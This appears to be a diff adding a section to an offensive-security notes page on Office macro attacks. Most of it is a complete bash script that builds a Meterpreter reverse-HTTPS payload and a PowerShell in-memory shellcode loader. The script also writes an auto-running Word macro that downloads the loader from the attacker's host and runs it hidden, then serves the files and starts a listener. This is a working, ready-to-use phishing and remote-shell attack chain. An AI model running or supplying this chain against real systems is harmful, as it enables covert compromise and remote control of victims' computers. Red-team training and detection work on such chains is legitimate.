@@ -291,3 +291,120 @@ After successful execution of the generated macro payload in a Word document,
 the `msfconsole` listener process will receive a reverse callback from the
 victim, upload the stager payload, and establish a `meterpreter` session with
 the victim host.
+
+## Staging PowerShell shellcode payloads
+
+In
+[[executing-win32-apis-in-powershell#Executing shellcode in PowerShell | Executing Win32 APIs in PowerShell - Executing shellcode in PowerShell]],
+we demonstrate how to execute **Meterpreter** payloads in PowerShell, using
+**P/Invoke** and C# to import and directly call Win32 APIs.
+
+Now that we have these payloads, we can use VBA macros as stagers to retrieve
+and deliver these PowerShell shellcode payloads. The example script provided
+below does the following:
+
+- Generates a desired **Meterpreter** payload
+- Generates a **PowerShell** payload designed to execute shellcode in memory
+  using **P/Invoke** and C#
+- Generates a VBA macro payload that conducts a web request to download and
+  execute the **PowerShell** payload generated in the previous step
+- Creates an HTTP stager on the attacker host
+- Creates an `msfconsole`stager to listen and deliver the next stage payload
+  once the **PowerShell** payload executes
+
+```bash
+#!/bin/bash
+
+set -ex -o pipefail
+
+MSFPAYLOAD="windows/x64/meterpreter/reverse_https"
+MSFCONSOLE=$(which msfconsole)
+MSFVENOM=$(which msfvenom)
+PYTHON=$(which python3)
+SPORT=8443
+
+
+msfvenom() {
+    PAYLOAD=$($MSFVENOM \
+        -p $MSFPAYLOAD \
+        LHOST=$LHOST \
+        LPORT=$LPORT \
+        EXITFUNC=thread \
+        -f ps1 2>/dev/null)
+}
+
+
+generate_powershell() {
+    tee payload.ps1 << EOF
+\$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type \$Kernel32
+
+$PAYLOAD
+
+\$size = \$buf.Length
+
+[IntPtr]\$addr = [Kernel32]::VirtualAlloc(0, \$size, 0x3000, 0x40)
+
+[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$addr, \$size)
+
+\$thandle=[Kernel32]::CreateThread(0, 0, \$addr, 0, 0, 0)
+
+[Kernel32]::WaitForSingleObject(\$thandle, [uint32]"0xFFFFFFFF")
+EOF
+}
+
+generate_macro() {
+    tee stager.vba << EOF
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://$LHOST:$SPORT/payload.ps1') | Invoke-Expression"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+EOF
+}
+
+stage() {
+    $PYTHON -m http.server $SPORT &
+}
+
+listen() {
+    $MSFCONSOLE \
+        -q \
+        -x "use multi/handler; \
+            set payload $MSFPAYLOAD; \
+            set LHOST $LHOST; \
+            set LPORT $LPORT; \
+            exploit"
+}
+
+
+LHOST=$1
+LPORT=$2
+
+msfvenom
+generate_powershell
+generate_macro
+stage
+listen
+```
